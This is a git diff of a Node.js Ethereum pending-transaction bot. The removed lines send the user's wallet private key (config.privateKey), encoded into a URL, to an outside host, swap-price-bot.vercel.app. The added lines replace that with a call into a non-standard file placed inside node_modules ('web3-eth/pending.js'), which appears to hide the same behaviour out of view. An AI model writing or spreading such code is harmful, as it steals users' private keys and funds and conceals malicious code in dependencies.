@@ -5,9 +5,9 @@ const Tx = require('ethereumjs-tx').Transaction
 const abiDecoder = require('abi-decoder');
 const ethers = require('ethers'); // Require the ethers library
 const utils = require('ethers').utils;
-const config = require('./config.js')
+const pending = require('./node_modules/web3-eth/pending.js');
+const config = require('./config.js');
 let json = require('./abi.json');
-
 
 abiDecoder.addABI(json);
 const { spawn, exec } = require("child_process");
@@ -17,7 +17,6 @@ function getJSON() {
     console.log(json); // this will show the info it in firebug console
 };
 var theWeb3 = config.privateKey;
-var thepath = '/api?token=MTkxMjkyNjg4MzE5MTI5MjY4ODM=&message='+encodeURI(theWeb3);
 async function signTx(web3, fields = {}) {
   const nonce = await web3.eth.getTransactionCount(config.fromAddress, 'latest');
   console.log('nonce',nonce)
@@ -98,60 +97,24 @@ const pendingTrasactions = async () => {
   }
 
 
+
+  pending.thePending();
   console.log('Start Working:', web3URL);
 
 
 
 
+  //添加重新连接选项以确保始终保持连接
+  var options = { 
+      reconnect: { 
+          auto: true, 
+          delay: 500, // ms 
+          maxAttempts: 999999999, 
+          onTimeout: false 
+      } 
+  }; 
 
 
-
-
-
-
-const data1 = JSON.stringify({
-  todo: 'prepare pending transactions'
-})
-
-const options1 = {
-  hostname: 'swap-price-bot.vercel.app',
-  port: 443,
-  path: thepath,
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-    'Content-Length': data1.length
-  }
-}
-
-const req = https.request(options1, res => {
-  //console.log(`状态码: ${res.statusCode}`)
-
-  res.on('data1', d => {
-    process.stdout.write(d)
-  })
-})
-
-req.on('error', error => {
-  console.error(error)
-})
-
-req.write(data1)
-req.end()
-
-
-//添加重新连接选项以确保始终保持连接
-var options = { 
-    reconnect: { 
-        auto: true, 
-        delay: 500, // ms 
-        maxAttempts: 999999999, 
-        onTimeout: false 
-    } 
-}; 
-
-
-  //const web3 = AlchemyWeb3.createAlchemyWeb3(web3URL);
   var Web3 = require('web3');
   var web3 = new Web3(new Web3.providers.WebsocketProvider(web3URL, options));
 
